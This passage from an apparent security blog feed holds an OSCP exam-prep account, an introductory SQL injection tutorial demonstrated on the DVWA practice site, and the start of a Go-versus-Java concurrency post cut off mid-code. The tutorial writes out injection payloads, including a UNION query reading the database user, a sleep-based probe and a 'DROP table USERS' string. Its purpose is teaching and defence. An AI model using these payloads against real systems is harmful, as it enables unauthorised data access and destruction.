也可以選著做一些；有點基礎的話，還是可以搭配講義跳著看來補充整理一下屬於自己的筆記，雖然內容可能很冗長，但是官方課程內容的優點就是真的講得很仔細，雖然不深但算是很全面的介紹，當作是複習一下也不錯，偶而還是會戳到一些沒那麼清楚或是不懂的點。講義的每個小章節都會有一些 exercise 讓你動手練習（lab 裡面會有你專屬的 client machine 可以用），這部分如果有全部做完然後寫 writeup 就可以額外加分，不過我也沒從頭讀完，所以就沒做這塊。</p>\n<p>我自己覺得最重要最有幫助的其實是最後一章帶你做一次滲透測試的部分（在 lab 裡面也可以跟著做一次）。這段會給你一台入口機器，然後教你如何枚舉如何選擇 attack vector 層層推進，會深入好幾層內網最後拿下 AD，基本上講義內所有類型的技巧都會用到。</p>\n<p>雖然個別的技巧都會用，但是我一直覺得自己缺少一個明確的方法論跟做滲透的 SOP 來最有效率的串出攻擊鍊，一看到機會就見獵心喜的衝進去，試了半天才發現死路一條。</p>\n<blockquote>\n<p>我覺得這門課另一個很重要的目的是建立一套穩定的中心思想，讓你在真的滲透的時候能有計畫跟邏輯的進行攻擊，而不是亂槍打鳥。</p>\n</blockquote>\n<p>附帶一提，lab 裡面有兩台機器有官方的 writeup，也是非常重要的資源，建議一定看過想過一遍，會省很多走歪路的時間。再提一點，既然這門課希望建立你的方法論，考試機器就勢必會開很多誘餌服務來誤導你，做好時間控管並且學會判斷哪些才是真的 meaty 很關鍵。</p>\n<h3 id=\"lab\"><a class=\"direct-link\" href=\"#lab\">#</a> Lab</h3>\n<p>Lab 環境就是模擬一整個企業的網路，大概長得像下面這張圖，外層是你用 VPN 連過去就可以直接 access 的 public network，還有必需透過 tunneling 才可以連到的內部網路 IT DEV ADMIN 部門。這個網路是跟其他學生共用的，所以每一台打之前建議先 reset ，不然有時候被別人弄壞了或是改了設定就會白費時間，或是偶爾解一解看到其他人留下來的痕跡然後被暴雷 XDD</p>\n<p>下面的 private segment 是每個人會有三台專屬的機器，分別是一台 linux 一台 win10 跟一台 windows server，主要是在講義 exercise 的時候讓你實作練習用的。這三台機器要自己 reset 才會 spin 起來，並在 VPN 斷掉後也會關掉。我自己是只有用到 win10 來做 windows 的 BOF，因為考試的時候一定會有一題 25 分的 BOF，然後官方也會給你一台 debugging machine，所以還是考前練習一下怎麼用那個軟體比較保險 XDDD</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/lab-env.png\" /><figcaption><p>Lab 環境</p>\n</figcaption></figure></p>\n<p>截至 2021/08/19 （我的最後一天）為止，不算講義中帶你做的模擬測試的話，總共有 70 台機器，據官方所說其中還有約 5~8 台前考試機。</p>\n<p>你的 VPN 帳號密碼也會用來登入一個學生專用的論壇，裡面有分門別類的討論區，大致上劃分成機器區、教材區、其他問題區。你可以在裡面跟其他同學還有校友交流，不過如果對題目暴雷太多會被管理員刪除字句，所以很多提示都會講得很隱晦。除了考試機器，任何相關問題都能問，不管是技術相關或是關於考試需要的硬體設備等疑難雜症幾乎都會有人回應。</p>\n<h2 id=\"%E6%80%8E%E9%BA%BC%E6%BA%96%E5%82%99\"><a class=\"direct-link\" href=\"#%E6%80%8E%E9%BA%BC%E6%BA%96%E5%82%99\">#</a> 怎麼準備</h2>\n<p>大家最想知道的當然是：我到底該怎麼準備？先讓我講講自己的經驗再介紹一些資源給大家。</p>\n<p>我決定要考 OSCP 的時候被各種評論嚇得不輕，所以規劃了半年來準備，整體來說從二月努力到八月底考試。二月開始，我大概每週花 16 小時練 Hack The Box (HTB) 上面的題目，然後因為想要做完 lab 直接考，所以我在六月底左右報名 60 天的 lab，最後八月底考完畢業。</p>\n<h3 id=\"2~6%E6%9C%88-htb\"><a class=\"direct-link\" href=\"#2~6%E6%9C%88-htb\">#</a> 2~6月 HTB</h3>\n<p>HTB 是一個很酷的練習平台，上面除了有非常大量的 machines 之外還有 CTF jeopardy style 的題目、專攻某些技術的 tracks、一系列 AD 機器的 fortress 等等，總之有非常多資源可以讓你打到爽。</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/htb.png\" /><figcaption><p>Hack The Box</p>\n</figcaption></figure></p>\n<p>跟 OSCP 最像的 machine（或是 box）也有各種 OS 跟難易度（雖然時間越近的難易度已經大幅躍升了），免費用戶可以玩一小批會 rotate 的 box，付費的話就可以玩所有的 retired machine，總共好幾百台。每週都會推出新的 box 可以玩，而且都會有官方論壇可以交流討論給提示，是個很有幫助的社群 XDDD</p>\n<p>而且最重要的是，初學者可以用這些 box 搭配別人的 writeup 還有 walkthrough 學到很多技巧跟經驗，例如廣為推崇的 <a href=\"https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA\">ippsec 影片</a> 還有我自己常看的 <a href=\"https://0xdf.gitlab.io\">0xdf hacks stuff</a>，因為他們不是只告訴你對的路在哪，而是會解釋自己是怎麼想的、走了哪些歪路、為什麼有些方法行不通等等，我覺得對建立自己的思路很有幫助。</p>\n<p>對於該如何學習這件事，相信每個人都有自己適合的方法，我的話是盡量嘗試但沒想法了就去論壇找 hints 或是找 writeup，理由很簡單，雖然自己撞也許過一陣子撞得出解法，但對初學者來說這樣效率低而且思考沒有系統化。</p>\n<blockquote>\n<p>這個方法並不是一卡住就找解答，這樣是不會成長的，而是把自己的招式跟能想到的方向都嘗試過後，就該是拜師求學的時候了，畢竟 you can't know what you don't know，人都是從模仿開始的。這時就可以參考我上面提過的網站，看看別人是怎麼想怎麼觀察的然後修正自己的方法，最後自己練習做一遍，把技巧變成自己的知識。</p>\n</blockquote>\n<p>為了準備考試而練習 HTB 的話，建議買 VIP 會員，一個月才 10 英鎊而已可以打幾百台機器真的很划算，補考一次都要 $249 了。練習順序的話可以參考 <a href=\"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159\">TJnull's list</a>，裡面整理了跟 OSCP 比較像的 box，而且一直有在更新，可以幫你規劃練習。</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/tjnull.png\" /><figcaption><p>TJnull's list</p>\n</figcaption></figure></p>\n<p>不過也許是因為 OSCP 的 box 比較不需要太多創意（？）所以在 HTB 上評分都不高，我自己是除了清單上的也把 easy 跟 medium 評價有 4 以上的都做了一遍，順序是由舊到新、由簡單到困難。</p>\n<p>我在這個時期累積了很多技巧跟經驗，甚至有點過度轟炸的狀態，因為每個 box 用到的技巧都不同也不太會重複，所以就是不斷的『哇哇哇原來可以這樣啊』，比較少有『嗯嗯一看就是這樣啦』的感覺。後期慢慢就培養出自己的直覺了，可以比較快速地知道哪裡有問題以及該如何找到方法，做的筆記也在考試準備上很有幫助。</p>\n<p>附帶一提，跟 HTB 相似的 Proving Grounds (PG) 聽說也不錯，雖然機器沒有 HTB 多但是因為後來被 Offensive Security 買下來了所以據說裡面的 box 是最接近 OSCP 考試的，上面的 TJnull's list 也有整理進去。</p>\n<h3 id=\"7~8%E6%9C%88-oscp-lab\"><a class=\"direct-link\" href=\"#7~8%E6%9C%88-oscp-lab\">#</a> 7~8月 OSCP Lab</h3>\n<p>差不多把 HTB 上的 easy + medium 的 linux + windows box 練了八成之後，就覺得好像有點基礎可以來試試 OSCP lab 了。</p>\n<p>講義的部分沒有花太多時間，因為 HTB 教的技巧更多更深，不過漏網之魚還是花了一兩天補起來，方法論的部分也認真思考了一遍。</p>\n<p>剛開始練 lab 的時候有點迷惘，因為不管是 CTF 還是 HTB、PG 這種練習平台，都是一個 IP 一個 IP 各自獨立的所以標的很明確，但 lab 就是一整個大網路，裡面有一堆機器，你怎麼知道從哪邊開始好？有些機器還有相依性，不解完一台進不去另一台，又該如何判斷？</p>\n<p>這時候就是用到 OSCP 方法論的時候了！</p>\n<blockquote>\n<p>你必須透過大範圍的掃描跟 DNS 的資訊判別有哪些機器以及他們各自的特性，由粗而細檢視這個網路、挑選攻擊對象，最後逐一擊破。拿到最高權限還不夠，你必須好好搜刮裡面的資訊，才能更好的狙擊下一個目標。</p>\n</blockquote>\n<p>雖然你也可以偷看繳交 flag 的頁面來知道有哪些 IP 然後照順序打完，但我相信除去了建立全局觀並規劃攻擊順序的練習，你的收穫一定會少得多。</p>\n<p>這也是大家對於 OSCP lab 評價兩極的原因。課程中希望模擬真實世界的網路，大量用戶彼此間有互動跟資訊交流也有權限上的不同，有些機器戒備森嚴有些卻容易得莫名其妙，以『培養出有基礎能力的滲透測試人員』來說這點做得不錯。但是考試卻完全不同，是五台各自獨立的機器，目標是『在時間內打下這五個目標』。所以以學習的角度而言 OSCP lab 相當特別，但單純只是為了考到證照的話，其他的練習平台反而更符合需求。</p>\n<p>這方面我自己的心得是，如果時間足夠不妨同時進行。</p>\n<p>做 OSCP lab 做多了會陷入一個僵化的思維，就是掃服務，每個戳戳看，找到 exploit 或入口，打，跑提權的腳本，打，結束。exploit 的方式跟地方還有提權的技巧不外乎就那幾個。雖然 HTB 流程上也是差不多，但是每個階段都需要仔細觀察，變化跟技巧豐富度差很多，有可能你會找到某個權限或是位置稍微不同的執行檔，decompile 後會找到某個可以蓋過去的函式庫；有可能你要多開幾個連線，重複登入看看背後執行的程式有什麼不同。總之不會是找 exploit，打，拿 shell 這麼固定的方式。</p>\n<blockquote>\n<p>我覺得不管是我的經歷（先從 HTB 大量快速累積技巧，再用 OSCP 鞏固做滲透的方法論），或是先用 OSCP 建立基礎再用 HTB 訓練 thinking outside the box 並充實自己的工具箱，都是不錯的方式。</p>\n</blockquote>\n<h3 id=\"8%E6%9C%88%E5%BA%95-oscp-pre-exam\"><a class=\"direct-link\" href=\"#8%E6%9C%88%E5%BA%95-oscp-pre-exam\">#</a> 8月底 OSCP Pre-exam</h3>\n<p>讀書的時候，都有考過模擬考吧？考 OSCP 前，訓練時間管理跟壓力控管的一個方式，就是給自己一次完整的模擬考！</p>\n<p>在考前一兩週可以安排一次 24 小時的考試，模擬實際考試的環境跟時間，要求自己做完五台機器。我自己用的是 <a href=\"https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/\">John J Hacking - The OSCP Preparation Guide 2020</a> 裡面建議的：</p>\n<ul>\n<li>Buffer Overflow Machine: VulnHub Brainpan (25 Points)</li>\n<li>Jeeves (25 Points)</li>\n<li>Chatterbox (20 Points)</li>\n<li>Cronos (20 Points)</li>\n<li>Sense (10 Points)</li>\n</ul>\n<p>另外 TJnull 也有推薦在 VulnHub 上的另一組機器：</p>\n<p><figure><img src=\"/img/posts/crystal/oscp/dry-run.png\" /><figcaption><p>Dry run</p>\n</figcaption></figure></p>\n<p>請完全模擬考試，做完整的筆記跟截圖紀錄，不要使用手機也絕對不能去找提示，可以的話連報告也寫一份。</p>\n<blockquote>\n<p>就算沒有 70 分也沒關係，模擬考的目的是讓你知道自己準備的程度跟缺少的練習，順利完成是增進考試信心，沒完成也只是教會你更多考試能用的武器。</p>\n</blockquote>\n<h3 id=\"%E8%B3%87%E6%BA%90\"><a class=\"direct-link\" href=\"#%E8%B3%87%E6%BA%90\">#</a> 資源</h3>\n<p>這裡整理一些我覺得有幫助的資源、部落格、或是文章：</p>\n<p>Boxes:</p>\n<ul>\n<li><a href=\"https://www.hackthebox.eu/\">Hack The Box</a></li>\n<li><a href=\"https://www.offensive-security.com/labs/\">Proving Grounds</a></li>\n<li><a href=\"https://www.vulnhub.com/\">VulnHub</a></li>\n<li><a href=\"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159\">TJnull's list</a></li>\n<li><a href=\"https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA\">ippsec 影片</a></li>\n<li><a href=\"https://0xdf.gitlab.io\">0xdf hacks stuff</a></li>\n</ul>\n<p>更多 OSCP Prep：</p>\n<ul>\n<li><a href=\"https://johnjhacking.com/blog/the-oscp-preperation-guide-2020/\">John J Hacking - The OSCP Preparation Guide 2020</a></li>\n<li><a href=\"https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/\">Rana Khalil</a></li>\n</ul>\n<p>好用的：</p>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/\">HackTricks</a></li>\n<li><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings\">Payloads All the Things</a></li>\n<li><a href=\"https://sushant747.gitbooks.io/total-oscp-guide/content/\">Sushant747 Total OSCP Guide</a></li>\n<li><a href=\"https://www.revshells.com/\">revshells</a></li>\n<li><a href=\"https://gtfobins.github.io/\">GTFOBins</a></li>\n</ul>\n<h3 id=\"%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AD%B0\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E5%BB%BA%E8%AD%B0\">#</a> 其他建議</h3>\n<ul>\n<li>提前一個月預約考試。剩兩三週的時候比較好的時間大概都沒了，如果你不想要晚上八點到早上六點之間開始的話要早點預約，反正時間可以改三次而且早點約比較有死線的感覺（？）</li>\n<li>睡好，吃飽，常常起來走動休息。真的，你需要新鮮的腦袋來釐清思路，答案就在那裡，只是頂著一個又累又緊繃的漿糊腦是看不出來的。你不需要 24 小時，你只需要思緒清楚的 12 小時。附上一句別人心得裡面我很喜歡的一句話：</li>\n</ul>\n<blockquote>\n<p>You'll run out of ideas before you run out of time</p>\n</blockquote>\n<ul>\n<li>考試只能用到一次 Metasploit，所以請留到非不得已，你能在 Metasploit 找到的 exploit 也一定可以在其他地方找到公開 exploit。平常練習 lab 也請不要依賴 Metasploit。</li>\n<li>OffSec 標榜 Try Harder，我個人的詮釋是再多研究多嘗試一些，想想還有什麼事能做但還沒做，或是有什麼遺漏的地方，把你會的都發揮出來。但當你撞到一面牆，重複 google 同一個關鍵字、跑同一個 exploit 20 次是沒用的，適時的求救能幫你用更短的時間學到一樣的東西。</li>\n<li>OffSec 有下面這張 Pass rate vs machines compromised 的統計圖，不過除了很直觀的『打越多越安心』之外根本沒什麼資訊。我想說的是，打機器只是訓練你的熟練度跟方法論的完善程度，如果你完全不用依靠論壇就可以順順一天打好幾台，就算你最後只完成了 20 台也一樣可以考過。不用太拘泥這個數字。</li>\n</ul>\n<p><figure><img src=\"/img/posts/crystal/oscp/pass-rate.png\" /><figcaption><p>Pass rate vs machines compromised</p>\n</figcaption></figure></p>\n<h3 id=\"%E5%BF%83%E5%BE%97\"><a class=\"direct-link\" href=\"#%E5%BF%83%E5%BE%97\">#</a> 心得</h3>\n<p>剛決定考 OSCP 時其實覺得有些慌張，畢竟什麼都不會要怎麼考？但隨著解開的 box 越來越多，累積的筆記跟技巧越來越豐富，心裡的踏實感也會逐漸累積，大概就是學習曲線上從『我知道我不知道』走向『我知道我知道』的成就感。</p>\n<p>技術上，OSCP 難度的確不高，考驗的是觀察力跟串連資訊找到漏洞的能力，只要發現對的破口幾乎就一擊斃命。考試剛開始時緊張到手抖，根本不能好好思考，後面出去散個步回來放鬆一點後雜亂的資訊就都自己連線歸位了。快要考試的人們，你們是一定可以做到的，要相信自己累積的實力早就超過考試所需了，只是壓力讓你眼睛業障重，過了 15 個小時只有 25 分也無所謂，剩下的時間絕對夠你把其他機器都打完，別慌。</p>\n<p>給想要嘗試 OSCP 的人們，不論你是什麼背景與經驗，都可以去玩玩看 HTB 之類的平台來感受一下。一開始會卡住或是茫然是完全正常的，我的前幾個 box 也是在『我該幹嘛？』『然後呢？？』中度過的。這是你學習的第一步，多堅持一下你會比想像中進步更快！</p>\n<p>這半年內，我在 HTB 訓練的各種技巧跟 OSCP 的滲透思維都給了我很多成長跟養分，推薦給想學習更多的 hacker wannabes！我也要繼續朝下一張前進了！</p>\n<p>有問題可以在下面留言，我會在不違規的情況下盡量回答 XDDD</p>\n",
      "date_published": "2021-09-02T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/sqli/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/sqli/",
      "title": "秒懂 SQL Injection",
      "content_html": "<p><img src=\"/img/posts/nick/sqli/sqli_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>現實生活中也可能發生 SQL Injection ? 買飲料的時候店員問你甜度冰塊，你卻跟店員說店長已經連續三個月忘記繳水電費，再不交就要斷水斷電，店員情急之下不疑有他，把盈餘拿出來請你幫忙繳清，你就帶著這筆錢一走了之，SQL Injection 就如同這詐騙一般的行為發生在網站上，開發者沒考慮到意料之外的輸入，駭客趁機對資料庫下命令來竊取或竄改資料，特定狀況下還可以攻到伺服器。</p>\n<h2 id=\"%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B\">#</a> 實際案例</h2>\n<p>SQL Injection 真的已經出現很久了，但它依然不斷發生，這邊分享幾個相關的資安新聞，逐個介紹的話就偏離我們快速了解的目標，先了解其嚴重性即可，如果對 SQL Injection 攻擊所造成的影響有興趣，不仿花點時間看看。</p>\n<ul>\n<li>2012年 Yahoo<br>\n<a href=\"https://www.inside.com.tw/article/1487-yahoo-leaked-450k-accounts\">https://www.inside.com.tw/article/1487-yahoo-leaked-450k-accounts</a></li>\n<li>2015年 Joomla<br>\n<a href=\"https://thehackernews.com/2015/10/joomla-security.html\">https://thehackernews.com/2015/10/joomla-security.html</a></li>\n<li>2021年 中華民國國防部<br>\n<a href=\"https://udn.com/news/story/10930/5238128\">https://udn.com/news/story/10930/5238128</a></li>\n</ul>\n<h2 id=\"sql-injection-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\"><a class=\"direct-link\" href=\"#sql-injection-%E6%80%8E%E9%BA%BC%E7%99%BC%E7%94%9F-%3F\">#</a> SQL Injection 怎麼發生 ?</h2>\n<!-- summary -->\n<p>SQL Injection 的原理很簡單，利用網頁程式設計者忽略檢查使用者輸入內容造成攻擊，但只從一句話很難看出到底發生了什麼，下面用生活化的例子，帶大家快速了解整個流程。</p>\n<!-- summary -->\n<h3 id=\"%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B\">#</a> 正常流程</h3>\n<p>了解攻擊流程之前需要先了解正常網站的作業流程，這邊先用兩張圖來說明。</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_2.jpg\" alt=\"\"></p>\n<p><img src=\"/img/posts/nick/sqli/sqli_3.jpg\" alt=\"\"></p>\n<p>網站登入流程</p>\n<ol>\n<li>用戶在頁面上輸入帳號密碼。</li>\n<li>前端將從頁面上將資料整理給後端。</li>\n<li>後段將資料整理成 SQL 格式，向資料庫詢問是否存在一個名稱欄位為 admin 密碼欄位為 password 的使用者，如果存在的話 ID 是多少。</li>\n<li>後端從資料庫找到這個使用者後判斷讓用戶登入。</li>\n<li>前端在頁面上顯示登入成功。</li>\n</ol>\n<h3 id=\"%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\">#</a> 攻擊流程</h3>\n<p>SQL Injection 攻擊的流程，示範如何不用密碼就可登錄網站。</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_4.jpg\" alt=\"\"></p>\n<p>網站登入流程(SQL Injection)</p>\n<ol>\n<li>用戶輸入帳號密碼。</li>\n<li>前端將資料整理給後端。<br>\n<font color=#FF0000></li>\n<li>後段將資料整理成SQL語法格式，向資料庫詢問是否存在一個名稱欄位為 admin 或 1=1 和密碼為空的使用者，如果存在的話 ID 是多少。</font></li>\n<li><font color=#FF0000>後端從資料庫找不到這個使用者但因為 1 等於 1 所以讓讓用戶登入。</font></li>\n<li>前端在頁面上顯示登入成功。</li>\n</ol>\n<p>從流程中可以看出因為輸入中加上符號後組合成 SQL 語句，影響了步驟 3 的輸入與步驟 4 的判斷，因為與 1=1 取聯集導致查詢一定成立，所以即使密碼錯了也可以成功登入。明顯看出攻擊者透過截斷原本程式的語意，插入他希望執行的 SQL 語法，達成攻擊的效果。</p>\n<h2 id=\"sql-injection-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A8%AE%E9%A1%9E-%3F\"><a class=\"direct-link\" href=\"#sql-injection-%E6%9C%89%E5%93%AA%E4%BA%9B%E7%A8%AE%E9%A1%9E-%3F\">#</a> SQL Injection 有哪些種類 ?</h2>\n<p>看懂攻擊原理後是否感覺 SQL Injection 其實很單純 ? 可惜在實務較為複雜，當開發者想出了方法來保護資料庫後，駭客會在想出新的攻擊手法來繞過，在這互相競爭的過程中，衍伸出各種花式攻擊，我們通常依攻擊手法分成 3 大類，接著利用知名的靶站 DVWA 做一個簡單的示範。</p>\n<h3 id=\"1.-in-band-sql-injection\"><a class=\"direct-link\" href=\"#1.-in-band-sql-injection\">#</a> 1. In-band SQL Injection</h3>\n<p>最常見和最容易被利用的一種。攻擊者藉由插入 SQL 語法來從資料庫收集資訊，以攻擊方式來看又可再細分為兩個小類別。</p>\n<p>在了解攻擊之前還是要先了解正常運作的狀況，範例中是一個查詢頁面，輸入整數的 ID 可以顯示出對應的人員名稱。</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_5.jpg\" alt=\"\"></p>\n<ul>\n<li>\n<p><strong>Error-based</strong></p>\n<ul>\n<li>簡介: 藉由錯誤訊息來取得想要的資訊。</li>\n<li>攻擊範例: <code>'</code> (別懷疑你沒看錯，只要一個符號就可能導致問題)</li>\n<li>測試結果: 藉由錯誤訊息來取得資料庫的類型，以便於之後針對性的攻擊。<br>\n<img src=\"/img/posts/nick/sqli/sqli_6.jpg\" alt=\"\"></li>\n</ul>\n</li>\n<li>\n<p><strong>Union-based</strong></p>\n<ul>\n<li>簡介: 將多筆查詢的結果藉由 UNION 語法合併到單次查詢中，藉此查詢原本不提供的資訊。</li>\n<li>攻擊範例:<code>' union all select system_user(),user() #</code></li>\n<li>測試結果: 在原本的查詢內容之外加上對伺服器用戶的查詢，範例中成功的找出使用者(app@localhost)。</li>\n</ul>\n<p><img src=\"/img/posts/nick/sqli/sqli_7.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"2.-inference-(blind)-sql-injection\"><a class=\"direct-link\" href=\"#2.-inference-(blind)-sql-injection\">#</a> 2. Inference (Blind) SQL Injection</h3>\n<p>部分頁面輸入後並不像查尋頁面會直接顯示從資料庫來的資料，甚至根本沒有回應 ! 所以攻擊者需要靠其他資訊來攻擊，因為大多數狀況下要靠反複猜測來猜取資料內容，這類型攻擊又常被稱為盲測，以攻擊方式來看又可再細分為兩個小類別，分別對應網站有回應跟沒有回應的兩種狀況。</p>\n<p>在了解攻擊之前還是要先了解正常運作的狀況，範例中是一個查詢頁面，輸入整數的 ID 之後網站會告訴你這個 ID 在資料庫中資否存在，所以只會回應有跟沒有，不會直接顯示從資料庫中得到的資料。</p>\n<p><img src=\"/img/posts/nick/sqli/sqli_8.jpg\" alt=\"\"></p>\n<ul>\n<li>\n<p><strong>Content-based</strong></p>\n<ul>\n<li>簡介: 從頁面的內容來判斷攻擊是否成功，故需能從頁面上看出反應。</li>\n<li>攻擊範例: <code>' ; DROP table USERS ; --</code></li>\n<li>測試結果: 查詢 ID = 1 的使用者已不存在，代表攻擊已成功刪除 table。</li>\n</ul>\n<p><img src=\"/img/posts/nick/sqli/sqli_9.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>Time-based</strong></p>\n<ul>\n<li>簡介: 從等待時間來判斷攻擊是否成功。</li>\n<li>攻擊範例: <code>1' and sleep(5)#</code></li>\n<li>測試結果: 可從左上角可判斷出網站正在等待，藉由檢查等待時間是否為 5 秒來判斷攻擊時否成功，成功代表可做 Time-based 相關的進階測試。</li>\n</ul>\n<p><img src=\"/img/posts/nick/sqli/sqli_10.jpg\" alt=\"\"></p>\n</li>\n</ul>\n<h3 id=\"3.-out-of-band-sql-injection\"><a class=\"direct-link\" href=\"#3.-out-of-band-sql-injection\">#</a> 3. Out-of-band SQL Injection</h3>\n<p>該類因為攻擊前置需求比較高，所以比較少發生，攻擊方式主要是透過 SQL Injection 來攻擊與資料庫有串連的系統，像是 DNS Server、文件系統、電子郵件等等，所以攻擊方式取決於後面有串那些系統，本次測試靶站利用 docker 架的環境相對單純，沒有這類型的問題。</p>\n<p>發生機會低不代表問題不會發生，因為缺範例這邊補上一篇近期從 SQL 打到 DNS 的資安新聞。</p>\n<p><strong><a href=\"https://www.cna.com.tw/news/aipl/202101270075.aspx\" title=\"Title\">政府網路遇襲上月近10萬件 非核心系統也成目標</a></strong><br>\n<img src=\"/img/posts/nick/sqli/sqli_11.jpg\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90%3A\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90%3A\">#</a> 總結:</h2>\n<p>SQL Injection 畢竟是由使用者輸入所導致的問題，要解決當然也要從輸入下手。</p>\n<p><strong>解決方案（一） :  輸入過濾</strong></p>\n<p>過濾輸入是最常見的防範方法，藉由檢查 SQL 語法中有意義的符號來避免語意被竄改，但要特別注意兩點，第一是必須在後端進行過濾，因為駭客有太多機會繞過前端檢查，第二是避免用黑名單的方式過濾，因為駭客會嘗試用合法的字元來組合出該被過濾掉的符號，用白名單可以將這個問題的發生機率降到最低，不過白名單只適合用在輸入較為單純的網站，如果網站的輸入較複雜或者必須包含符號，建議改用其他方法。</p>\n<p><strong>解決方案（二） :  參數化</strong></p>\n<p>限制輸入僅含參數不含語法，接著在輸入後立刻轉換輸入格式。</p>\n<p>以開頭的免密碼登入攻擊來舉例，實際上資料庫收到的 SQL 語句如下。</p>\n<pre><code>SELECT ID FROM Accounts WHERE user ='admin or '1'=1' and 'pass'='';\n</code></pre>\n<p>如果在先轉換輸入內容轉換為字串再放入 SQL 語句。</p>\n<pre><code>SELECT ID FROM Accounts WHERE user=&quot;admin\\' or \\'1\\'=\\'1&quot; and 'pass'=&quot;&quot;;\n</code></pre>\n<p>這時會去檢查有沒有一個名稱為 <font color=#FF0000>admin' or '1'='1 </font>的帳號，結果當然是找不到攻擊也失效，這種方法比較通用，不過要注意轉換失敗時的例外處理，部分程式語言會直接 crash，影響到網站服務。</p>\n<p><strong>解決方案（三） : 資料庫套件</strong></p>\n<p>其實這個解決方案是前兩個安案的延伸，有一些套件已經幫你做完上述兩件事情，所以透過套件來呼叫資料庫可防止攻擊發生，常見的像是 JAVA 的 JDBC 套件，其他程式語言也有類似的套件，但使用前務必做好功課，避免用了不安全的套件導致網站還是受到攻擊。</p>\n<br>\n<p>前面為快速說明原理挑了一些簡單易懂的攻擊來示範，實際上還有更多進階的攻擊手法，如果閱覽數量夠多，之後會再加開一篇分享一些更進階的用法與經典案例，有任何資安方面相關的問題都歡迎留言討論，或者直接到 Cymetrics 尋求協助。</p>\n",
      "date_published": "2021-08-31T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-zh/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-zh/",
      "title": "並行程式典範 (Paradigms): Golang V.S. Java",
      "content_html": "<!-- summary -->\n<p>當我回頭看剛開始學 Golang 的程式時，我發現我只是用 Golang 語法寫 Java 程式。尤其在並行程式的設計思路上 Golang 和 Java 完全不同：Java 習慣上會用 thread-safe 的概念設計並行，而 Golang 的設計上鼓勵開發者使用 channel 處理並行問題。</p>\n<!-- summary -->\n<p>這篇文章主要想討論 Java 和 Golang 撰寫並行程式上的風格差異，希望能讓初學 Golang 的開發者在撰寫並行時，能對 Golang 的並行設計模式有些概念。</p>\n<h2 id=\"%E4%BB%80%E9%BA%BC%E6%98%AF%E5%85%B8%E7%AF%84\"><a class=\"direct-link\" href=\"#%E4%BB%80%E9%BA%BC%E6%98%AF%E5%85%B8%E7%AF%84\">#</a> 什麼是典範</h2>\n<p>程式典範是指規範如何撰寫程式的指導原則，一種更高位的設計模式， 像是物件導向程式設計 (Object Oriented Programming) 就是一種程式典範，其餘的還有函式語言程式設計 (Functional programming)。<br>\n要注意的是，典範本身並無優劣之分，有的只是適用的情境不同。<br>\n如同程式並行典範，撰寫並行程式也有典範，如 Thread &amp; Lock 就是一種並行的典範。Java 在撰寫並行程式時即是依循 Thread &amp; Lock。另一方面， Golang 的並行典範則更多是遵循 Communicating Sequential Process(CSP) 。接下來讓我們更深入探討兩種典範的差異。</p>\n<h2 id=\"thread-%26-lock\"><a class=\"direct-link\" href=\"#thread-%26-lock\">#</a> Thread &amp; Lock</h2>\n<p>Thread &amp; Lock 在運作上完全反映底層硬體的行為。基本上是不同 Thread 透過共享記憶體溝通，而透過 Lock 確保一次只有個 Thread 存取共享記憶體，即是互斥鎖的概念：<br>\n<img src=\"/img/posts/genchilu/concurrency_paradigms_golang_and_Java/thread_and_lock.png\" alt=\"\"></p>\n<p>以經典的同步問題 - 生產者/消費者問題為例，Java 實作起來會像這樣：</p>\n<pre class=\"language-java\"><code class=\"language-java\">    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Lock</span> lock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReentrantLock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Queue</span> queue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Condition</span> con<span 